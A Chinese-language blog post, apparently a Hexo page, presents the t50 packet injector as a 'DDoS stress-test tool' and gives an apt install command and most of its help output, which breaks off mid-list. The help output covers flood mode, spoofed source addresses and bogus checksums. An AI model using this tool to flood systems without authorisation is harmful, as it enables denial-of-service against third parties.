@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>DDOS-压力测试工具(神) - 杨CC的小世界</title>
+  
+    <link rel="shortcut icon" href="https://pic1.imgdb.cn/item/678a0c34d0e0a243d4f52d7b.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="DDOS-压力测试工具(神) - 杨CC的小世界" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="https://yancy77.cn/2025/01/17/DDOS-%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-%E7%A5%9E/index.html" />
+  
+  <meta property="og:image" content="https://pic1.imgdb.cn/item/678a0c34d0e0a243d4f52d7b.png" />
+  
+  <meta property="og:article:published_time" content="2025-01-17T11:56:26.000Z" />
+  
+  <meta property="og:article:author" content="杨CC" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">杨CC与杨小亿的世界</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/">首页</a>
+            
+            
+            
+            <a class="nav-item" href="/tags">标签</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">分类</a>
+            
+            
+            
+            <a class="nav-item" href="/archives">归档</a>
+            
+            
+            
+            <a class="nav-item" href="/about">关于作者</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/Sgyling" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/渗透/">渗透</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>January</span>
+            <span>17,</span>
+            <span>2025</span>
+        </div>
+        
+
+        <h1 class="title">DDOS-压力测试工具(神)</h1>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="0x1-t50"><a href="#0x1-t50" class="headerlink" title="0x1 t50"></a>0x1 t50</h1><p>本文链接来自于:<a target="_blank" rel="noopener" href="https://kms.app/archives/441/">https://kms.app/archives/441/</a></p>
+<ul>
+<li><p>早期在github上有源码,后期被废除了,目前主要有两个源码托管地</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://gitlab.com/fredericopissarra/t50">gitlab</a></li>
+<li><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/t50/">sourceforge</a></li>
+</ul>
+</li>
+<li><p>t50被设计用来针对<code>ICMP/IGMP/TCP/UDP</code>协议的压力测试工具</p>
+<ul>
+<li>具体支持的协议如下<ul>
+<li>ICMP - Internet Control Message Protocol</li>
+<li>IGMPv1 - Internet Group Management Protocol v1</li>
+<li>IGMPv3 - Internet Group Management Protocol v3</li>
+<li>TCP - Transmission Control Protocol</li>
+<li>EGP - Exterior Gateway Protocol</li>
+<li>UDP - User Datagram Protocol</li>
+<li>RIPv1 - Routing Information Protocol v1</li>
+<li>RIPv2 - Routing Information Protocol v2</li>
+<li>DCCP - Datagram Congestion Control Protocol</li>
+<li>RSVP - Resource ReSerVation Protocol</li>
+<li>GRE - Generic Routing Encapsulation</li>
+<li>IPSec - Internet Protocol Security (AH&#x2F;ESP)</li>
+<li>EIGRP - Enhanced Interior Gateway Routing Protocol</li>
+<li>OSPF - Open Shortest Path First</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>t50被主流包管理器支援,可以通过apt方便的安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y t50</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="0x2-帮助信息"><a href="#0x2-帮助信息" class="headerlink" title="0x2 帮助信息"></a>0x2 帮助信息</h1><ul>
+<li><p>这里截取一份t50的快速开始</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line">root@docker:~# t50 --<span class="built_in">help</span></span><br><span class="line">T50 Experimental Mixed Packet Injector Tool v5.8.7</span><br><span class="line">Originally created by Nelson Brito &lt;nbrito@sekure.org&gt;</span><br><span class="line">Previously maintained by Fernando Mercês &lt;fernando@mentebinaria.com.br&gt;</span><br><span class="line">Maintained by Frederico Lamberti Pissarra &lt;fredericopissarra@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Usage: t50 &lt;host[/cidr]&gt; [options]</span><br><span class="line">Common Options:</span><br><span class="line">    --threshold NUM           Threshold of packets to send     (default 1000)</span><br><span class="line">    --flood                   This option supersedes the <span class="string">&#x27;threshold&#x27;</span></span><br><span class="line">    --encapsulated            Encapsulated protocol (GRE)      (default OFF)</span><br><span class="line"> -B,--bogus-csum              Bogus checksum                   (default OFF)</span><br><span class="line">    --shuffle                 Shuffling <span class="keyword">for</span> T50 protocol       (default OFF)</span><br><span class="line"> -q,--quiet                   Disable INFOs</span><br><span class="line">    --turbo                   Extend the performance           (default OFF)</span><br><span class="line"> -l,--list-protocols          List all available protocols</span><br><span class="line"> -v,--version                 Print version and <span class="built_in">exit</span></span><br><span class="line"> -h,--<span class="built_in">help</span>                    Display this <span class="built_in">help</span> and <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">GRE Options:</span><br><span class="line">    --gre-seq-present         GRE sequence <span class="comment"># present           (default OFF)</span></span><br><span class="line">    --gre-key-present         GRE key present                  (default OFF)</span><br><span class="line">    --gre-sum-present         GRE checksum present             (default OFF)</span><br><span class="line">    --gre-key NUM             GRE key                          (default RANDOM)</span><br><span class="line">    --gre-sequence NUM        GRE sequence <span class="comment">#                   (default RANDOM)</span></span><br><span class="line">    --gre-saddr ADDR          GRE IP <span class="built_in">source</span> IP address         (default RANDOM)</span><br><span class="line">    --gre-daddr ADDR          GRE IP destination IP address    (default RANDOM)</span><br><span class="line"></span><br><span class="line">DCCP/TCP/UDP Options:</span><br><span class="line">    --sport NUM               DCCP|TCP|UDP <span class="built_in">source</span> port         (default RANDOM)</span><br><span class="line">    --dport NUM               DCCP|TCP|UDP destination port    (default RANDOM)</span><br><span class="line"></span><br><span class="line">TCP Options:</span><br><span class="line">    --ack-seq NUM             TCP ACK sequence <span class="comment">#               (default RANDOM)</span></span><br><span class="line">    --sequence NUM            TCP SYN sequence <span class="comment">#               (default RANDOM)</span></span><br><span class="line">    --data-offset NUM         TCP data offset                  (default 5)</span><br><span class="line"> -F,--fin                     TCP FIN flag                     (default OFF)</span><br><span class="line"> -S,--syn                     TCP SYN flag                     (default OFF)</span><br><span class="line"> -R,--rst                     TCP RST flag                     (default OFF)</span><br><span class="line"> -P,--psh                     TCP PSH flag                     (default OFF)</span><br><span class="line"> -A,--ack                     TCP ACK flag                     (default OFF)</span><br><span class="line"> -U,--urg                     TCP URG flag                     (default OFF)</span><br><span class="line"> -E,--ece                     TCP ECE flag                     (default OFF)</span><br><span class="line"> -C,--cwr                     TCP CWR flag                     (default OFF)</span><br><span class="line"> -W,--window NUM              TCP Window size                  (default NONE)</span><br><span class="line">    --urg-pointer NUM         TCP URG pointer                  (default NONE)</span><br><span class="line">    --mss NUM                 TCP Maximum Segment Size         (default NONE)</span><br><span class="line">    --wscale NUM              TCP Window Scale                 (default NONE)</span><br><span class="line">    --tstamp NUM:NUM          TCP Timestamp (TSval:TSecr)      (default NONE)</span><br><span class="line">    --sack-ok                 TCP SACK-Permitted               (default OFF)</span><br><span class="line">    --ttcp-cc NUM             T/TCP Connection Count (CC)      (default NONE)</span><br><span class="line">    --ccnew NUM               T/TCP Connection Count (CC.NEW)  (default NONE)</span><br><span class="line">    --ccecho NUM              T/TCP Connection Count (CC.ECHO) (default NONE)</span><br><span class="line">    --sack NUM:NUM            TCP SACK Edges (Left:Right)      (default NONE)</span><br><span class="line">    --md5-signature           TCP MD5 signature included       (default OFF)</span><br><span class="line">    --authentication          TCP-AO authentication included   (default OFF)</span><br><span class="line">    --auth-key-id NUM         TCP-AO authentication key ID     (default 1)</span><br><span class="line">    --auth-next-key NUM       TCP-AO authentication next key   (default 1)</span><br><span class="line">    --nop                     TCP No-Operation                 (default EOL)</span><br><span class="line"></span><br><span class="line">IP Options:</span><br><span class="line"> -s,--saddr ADDR              IP <span class="built_in">source</span> IP address             (default RANDOM)</span><br><span class="line">    --tos NUM                 IP <span class="built_in">type</span> of service               (default 0x40)</span><br><span class="line">    --<span class="built_in">id</span> NUM                  IP identification                (default RANDOM)</span><br><span class="line">    --frag-offset NUM         IP fragmentation offset          (default 0)</span><br><span class="line">    --ttl NUM                 IP <span class="keyword">time</span> to live                  (default 255)</span><br><span class="line">    --protocol PROTO          IP protocol                      (default TCP)</span><br><span class="line"></span><br><span class="line">ICMP Options:</span><br><span class="line">    --icmp-type NUM           ICMP <span class="built_in">type</span>                        (default 8)</span><br><span class="line">    --icmp-code NUM           ICMP code                        (default 0)</span><br><span class="line">    --icmp-gateway ADDR       ICMP redirect gateway            (default RANDOM)</span><br><span class="line">    --icmp-id NUM             ICMP identification              (default RANDOM)</span><br><span class="line">    --icmp-sequence NUM       ICMP sequence <span class="comment">#                  (default RANDOM)</span></span><br><span class="line"></span><br><span class="line">EGP Options:</span><br><span class="line">    --egp-type NUM            EGP <span class="built_in">type</span>                         (default 3)</span><br><span class="line">    --egp-code NUM            EGP code                         (default 3)</span><br><span class="line">    --egp-status NUM          EGP status                       (default 1)</span><br><span class="line">    --egp-as NUM              EGP autonomous system            (default RANDOM)</span><br><span class="line">    --egp-sequence NUM        EGP sequence <span class="comment">#                   (default RANDOM)</span></span><br><span class="line">    --egp-hello NUM           EGP hello interval               (default RANDOM)</span><br><span class="line">    --egp-poll NUM            EGP poll interval                (default RANDOM)</span><br><span class="line"></span><br><span class="line">RIP Options:</span><br><span class="line">    --rip-command NUM         RIPv1/v2 <span class="built_in">command</span>                 (default 2)</span><br><span class="line">    --rip-family NUM          RIPv1/v2 address family          (default 2)</span><br><span class="line">    --rip-address ADDR        RIPv1/v2 router address          (default RANDOM)</span><br><span class="line">    --rip-metric NUM          RIPv1/v2 router metric           (default RANDOM)</span><br><span class="line">    --rip-domain NUM          RIPv2 router domain              (default RANDOM)</span><br><span class="line">    --rip-tag NUM             RIPv2 router tag                 (default RANDOM)</span><br><span class="line">    --rip-netmask ADDR        RIPv2 router subnet mask         (default RANDOM)</span><br><span class="line">    --rip-next-hop ADDR       RIPv2 router next hop            (default RANDOM)</span><br><span class="line">    --rip-authentication      RIPv2 authentication included    (default OFF)</span><br><span class="line">    --rip-auth-key-id NUM     RIPv2 authentication key ID      (default 1)</span><br><span class="line">    --rip-auth-sequence NUM   RIPv2 authentication sequence <span class="comment">#  (default RANDOM)</span></span><br><span class="line"></span><br><span class="line">DCCP Options:</span><br><span class="line">    --dccp-data-offset NUM    DCCP data offset                 (default VARY)</span><br><span class="line">    --dccp-cscov NUM          DCCP checksum coverage           (default 0)</span><br><span class="line">    --dccp-ccval NUM          DCCP HC-Sender CCID              (default RANDOM)</span><br><span class="line">    --dccp-type NUM           DCCP <span class="built_in">type</span>                        (default 0)</span><br><span class="line">    --dccp-extended           DCCP extend <span class="keyword">for</span> sequence <span class="comment">#       (default OFF)</span></span><br><span class="line">    --dccp-sequence-1 NUM     DCCP sequence <span class="comment">#                  (default RANDOM)</span></span><br><span class="line">    --dccp-sequence-2 NUM     DCCP extended sequence <span class="comment">#         (default RANDOM)</span></span><br><span class="line">    --dccp-sequence-3 NUM     DCCP sequence <span class="comment"># low              (default RANDOM)</span></span><br><span class="line">    --dccp-service NUM        DCCP service code                (default RANDOM)</span><br><span class="line">    --dccp-acknowledge-1 NUM  DCCP acknowledgment <span class="comment"># high       (default RANDOM)</span></span><br><span class="line">    --dccp-acknowledge-2 NUM  DCCP acknowledgment <span class="comment"># low        (default RANDOM)</span></span><br><span class="line">    --dccp-reset-code NUM     DCCP reset code                  (default RANDOM)</span><br><span class="line"></span><br><span class="line">RSVP Options:</span><br><span class="line">    --rsvp-flags NUM          RSVP flags                       (default 1)</span><br><span class="line">    --rsvp-type NUM           RSVP message <span class="built_in">type</span>                (default 1)</span><br><span class="line">    --rsvp-ttl NUM            RSVP <span class="keyword">time</span> to live                (default 254)</span><br><span class="line">    --rsvp-session-addr ADDR  RSVP SESSION destination address (default RANDOM)</span><br><span class="line">    --rsvp-session-proto NUM  RSVP SESSION protocol ID         (default 1)</span><br><span class="line">    --rsvp-session-flags NUM  RSVP SESSION flags               (default 1)</span><br><span class="line">    --rsvp-session-port NUM   RSVP SESSION destination port    (default RANDOM)</span><br><span class="line">    --rsvp-hop-addr ADDR      RSVP HOP neighbor address        (default RANDOM)</span><br><span class="line">    --rsvp-hop-iface NUM      RSVP HOP logical interface       (default RANDOM)</span><br><span class="line">    --rsvp-time-refresh NUM   RSVP TIME refresh interval       (default 360)</span><br><span class="line">    --rsvp-error-addr ADDR    RSVP ERROR node address          (default RANDOM)</span><br><span class="line">    --rsvp-error-flags NUM    RSVP ERROR flags                 (default 2)</span><br><span class="line">    --rsvp-error-code NUM     RSVP ERROR code                  (default 2)</span><br><span class="line">    --rsvp-error-value NUM    RSVP ERROR value                 (default 8)</span><br><span class="line">    --rsvp-scope NUM          RSVP SCOPE <span class="comment"># of address(es)      (default 1)</span></span><br><span class="line">    --rsvp-address ADDR,...   RSVP SCOPE address(es)           (default RANDOM)</span><br><span class="line">    --rsvp-style-option NUM   RSVP STYLE option vector         (default 18)</span><br><span class="line">    --rsvp-sender-addr ADDR   RSVP SENDER TEMPLATE address     (default RANDOM)</span><br><span class="line">    --rsvp-sender-port NUM    RSVP SENDER TEMPLATE port        (default RANDOM)</span><br><span class="line">    --rsvp-tspec-traffic      RSVP TSPEC service traffic       (default OFF)</span><br><span class="line">    --rsvp-tspec-guaranteed   RSVP TSPEC service guaranteed    (default OFF)</span><br><span class="line">    --rsvp-tspec-r NUM        RSVP TSPEC token bucket rate     (default RANDOM)</span><br><span class="line">    --rsvp-tspec-b NUM        RSVP TSPEC token bucket size     (default RANDOM)</span><br><span class="line">    --rsvp-tspec-p NUM        RSVP TSPEC peak data rate        (default RANDOM)</span><br><span class="line">    --rsvp-tspec-m NUM        RSVP TSPEC minimum policed unit  (default RANDOM)</span><br><span class="line">    --rsvp-tspec-M NUM        RSVP TSPEC maximum packet size   (default RANDOM)</span><br><span class="line">    --rsvp-adspec-ishop NUM   RSVP ADSPEC IS HOP count         (default RANDOM)</span><br><span class="line">    --rsvp-adspec-path NUM    RSVP ADSPEC path b/w estimate    (default RANDOM)</span><br><span class="line">    --rsvp-adspec-m NUM       RSVP ADSPEC minimum path latency (default RANDOM)</span><br><span class="line">    --rsvp-adspec-mtu NUM     RSVP ADSPEC composed MTU         (default RANDOM)</span><br><span class="line">    --rsvp-adspec-guaranteed  RSVP ADSPEC service guaranteed   (default OFF)</span><br><span class="line">    --rsvp-adspec-Ctot NUM    RSVP ADSPEC ETE composed value C (default RANDOM)</span><br><span class="line">    --rsvp-adspec-Dtot NUM    RSVP ADSPEC ETE composed value D (default RANDOM)</span><br><span class="line">    --rsvp-adspec-Csum NUM    RSVP ADSPEC SLR point composed C (default RANDOM)</span><br><span class="line">    --rsvp-adspec-Dsum NUM    RSVP ADSPEC SLR point composed D (default RANDOM)</span><br><span class="line">    --rsvp-adspec-controlled  RSVP ADSPEC service controlled   (default OFF)</span><br><span class="line">    --rsvp-confirm-addr ADDR  RSVP CONFIRM receiver address    (default RANDOM)</span><br><span class="line"></span><br><span class="line">IPSEC Options:</span><br><span class="line">    --ipsec-ah-length NUM     IPSec AH header length           (default NONE)</span><br><span class="line">    --ipsec-ah-spi NUM        IPSec AH SPI                     (default RANDOM)</span><br><span class="line">    --ipsec-ah-sequence NUM   IPSec AH sequence <span class="comment">#              (default RANDOM)</span></span><br><span class="line">    --ipsec-esp-spi NUM       IPSec ESP SPI                    (default RANDOM)</span><br><span class="line">    --ipsec-esp-sequence NUM  IPSec ESP sequence <span class="comment">#             (default RANDOM)</span></span><br><span class="line"></span><br><span class="line">EIGRP Options:</span><br><span class="line">    --eigrp-opcode NUM        EIGRP opcode                     (default 1)</span><br><span class="line">    --eigrp-flags NUM         EIGRP flags                      (default RANDOM)</span><br><span class="line">    --eigrp-sequence NUM      EIGRP sequence <span class="comment">#                 (default RANDOM)</span></span><br><span class="line">    --eigrp-acknowledge NUM   EIGRP acknowledgment <span class="comment">#           (default RANDOM)</span></span><br><span class="line">    --eigrp-as NUM            EIGRP autonomous system          (default RANDOM)</span><br><span class="line">    --eigrp-type NUM          EIGRP <span class="built_in">type</span>                       (default 258)</span><br><span class="line">    --eigrp-length NUM        EIGRP length                     (default NONE)</span><br><span class="line">    --eigrp-k1 NUM            EIGRP parameter K1 value         (default 1)</span><br><span class="line">    --eigrp-k2 NUM            EIGRP parameter K2 value         (default 0)</span><br><span class="line">    --eigrp-k3 NUM            EIGRP parameter K3 value         (default 1)</span><br><span class="line">    --eigrp-k4 NUM            EIGRP parameter K4 value         (default 0)</span><br><span class="line">    --eigrp-k5 NUM            EIGRP parameter K5 value         (default 0)</span><br><span class="line">    --eigrp-hold NUM          EIGRP parameter hold <span class="keyword">time</span>        (default 360)</span><br><span class="line">    --eigrp-ios-ver NUM.NUM   EIGRP IOS release version        (default 12.4)</span><br><span class="line">    --eigrp-rel-ver NUM.NUM   EIGRP PROTO release version      (default 1.2)</span><br><span class="line">    --eigrp-next-hop ADDR     EIGRP [<span class="keyword">in</span>|ex]ternal next-hop     (default RANDOM)</span><br><span class="line">    --eigrp-delay NUM         EIGRP [<span class="keyword">in</span>|ex]ternal delay        (default RANDOM)</span><br><span class="line">    --eigrp-bandwidth NUM     EIGRP [<span class="keyword">in</span>|ex]ternal bandwidth    (default RANDOM)</span><br><span class="line">    --eigrp-mtu NUM           EIGRP [<span class="keyword">in</span>|ex]ternal MTU          (default 1500)</span><br><span class="line">    --eigrp-hop-count NUM     EIGRP [<span class="keyword">in</span>|ex]ternal hop count    (default RANDOM)</span><br><span class="line">    --eigrp-load NUM          EIGRP [<span class="keyword">in</span>|ex]ternal load         (default RANDOM)</span><br><span class="line">    --eigrp-reliability NUM   EIGRP [<span class="keyword">in</span>|ex]ternal reliability  (default RANDOM)</span><br><span class="line">    --eigrp-daddr ADDR/CIDR   EIGRP [<span class="keyword">in</span>|ex]ternal address(es)  (default RANDOM)</span><br><span class="line">    --eigrp-src-router ADDR   EIGRP external <span class="built_in">source</span> router     (default RANDOM)</span><br><span class="line">    --eigrp-src-as NUM        EIGRP external autonomous system (default RANDOM)</span><br><span class="line">    --eigrp-tag NUM           EIGRP external arbitrary tag     (default RANDOM)</span><br><span class="line">    --eigrp-proto-metric NUM  EIGRP external protocol metric   (default RANDOM)</span><br><span class="line">    --eigrp-proto-id NUM      EIGRP external protocol ID       (default 2)</span><br><span class="line">    --eigrp-ext-flags NUM     EIGRP external flags             (default RANDOM)</span><br><span class="line">    --eigrp-address ADDR      EIGRP multicast sequence address (default RANDOM)</span><br><span class="line">    --eigrp-multicast NUM     EIGRP multicast sequence <span class="comment">#       (default RANDOM)</span></span><br><span class="line">    --eigrp-authentication    EIGRP authentication included    (default OFF)</span><br><span class="line">    --eigrp-auth-key-id NUM   EIGRP authentication key ID      (default 1)</span><br><span class="line"></span><br><span class="line">OSPF Options:</span><br><span class="line">    --ospf-type NUM           OSPF <span class="built_in">type</span>                        (default 1)</span><br><span class="line">    --ospf-length NUM         OSPF length                      (default NONE)</span><br><span class="line">    --ospf-router-id ADDR     OSPF router ID                   (default RANDOM)</span><br><span class="line">    --ospf-area-id ADDR       OSPF area ID                     (default 0.0.0.0)</span><br><span class="line"> -1,--ospf-option-MT          OSPF multi-topology / TOS-based  (default RANDOM)</span><br><span class="line"> -2,--ospf-option-E           OSPF external routing capability (default RANDOM)</span><br><span class="line"> -3,--ospf-option-MC          OSPF multicast capable           (default RANDOM)</span><br><span class="line"> -4,--ospf-option-NP          OSPF NSSA supported              (default RANDOM)</span><br><span class="line"> -5,--ospf-option-L           OSPF LLS data block contained    (default RANDOM)</span><br><span class="line"> -6,--ospf-option-DC          OSPF demand circuits supported   (default RANDOM)</span><br><span class="line"> -7,--ospf-option-O           OSPF Opaque-LSA                  (default RANDOM)</span><br><span class="line"> -8,--ospf-option-DN          OSPF DOWN bit                    (default RANDOM)</span><br><span class="line">    --ospf-netmask ADDR       OSPF router subnet mask          (default RANDOM)</span><br><span class="line">    --ospf-hello-interval NUM OSPF HELLO interval              (default RANDOM)</span><br><span class="line">    --ospf-hello-priority NUM OSPF HELLO router priority       (default 1)</span><br><span class="line">    --ospf-hello-dead NUM     OSPF HELLO router dead interval  (default 360)</span><br><span class="line">    --ospf-hello-design ADDR  OSPF HELLO designated router     (default RANDOM)</span><br><span class="line">    --ospf-hello-backup ADDR  OSPF HELLO backup designated     (default RANDOM)</span><br><span class="line">    --ospf-neighbor NUM       OSPF HELLO <span class="comment"># of neighbor(s)      (default NONE)</span></span><br><span class="line">    --ospf-address ADDR,...   OSPF HELLO neighbor address(es)  (default RANDOM)</span><br><span class="line">    --ospf-dd-mtu NUM         OSPF DD MTU                      (default 1500)</span><br><span class="line">    --ospf-dd-dbdesc-MS       OSPF DD master/slave bit option  (default RANDOM)</span><br><span class="line">    --ospf-dd-dbdesc-M        OSPF DD more bit option          (default RANDOM)</span><br><span class="line">    --ospf-dd-dbdesc-I        OSPF DD init bit option          (default RANDOM)</span><br><span class="line">    --ospf-dd-dbdesc-R        OSPF DD out-of-band resync       (default RANDOM)</span><br><span class="line">    --ospf-dd-sequence NUM    OSPF DD sequence <span class="comment">#               (default RANDOM)</span></span><br><span class="line">    --ospf-dd-include-lsa     OSPF DD include LSA header       (default OFF)</span><br><span class="line">    --ospf-lsa-age NUM        OSPF LSA age                     (default 360)</span><br><span class="line">    --ospf-lsa-do-not-age     OSPF LSA <span class="keyword">do</span> not age              (default OFF)</span><br><span class="line">    --ospf-lsa-type NUM       OSPF LSA <span class="built_in">type</span>                    (default 1)</span><br><span class="line">    --ospf-lsa-id ADDR        OSPF LSA ID address              (default RANDOM)</span><br><span class="line">    --ospf-lsa-router ADDR    OSPF LSA advertising router      (default RANDOM)</span><br><span class="line">    --ospf-lsa-sequence NUM   OSPF LSA sequence <span class="comment">#              (default RANDOM)</span></span><br><span class="line">    --ospf-lsa-metric NUM     OSPF LSA metric                  (default RANDOM)</span><br><span class="line">    --ospf-lsa-flag-B         OSPF Router-LSA border router    (default RANDOM)</span><br><span class="line">    --ospf-lsa-flag-E         OSPF Router-LSA external router  (default RANDOM)</span><br><span class="line">    --ospf-lsa-flag-V         OSPF Router-LSA virtual router   (default RANDOM)</span><br><span class="line">    --ospf-lsa-flag-W         OSPF Router-LSA wild router      (default RANDOM)</span><br><span class="line">    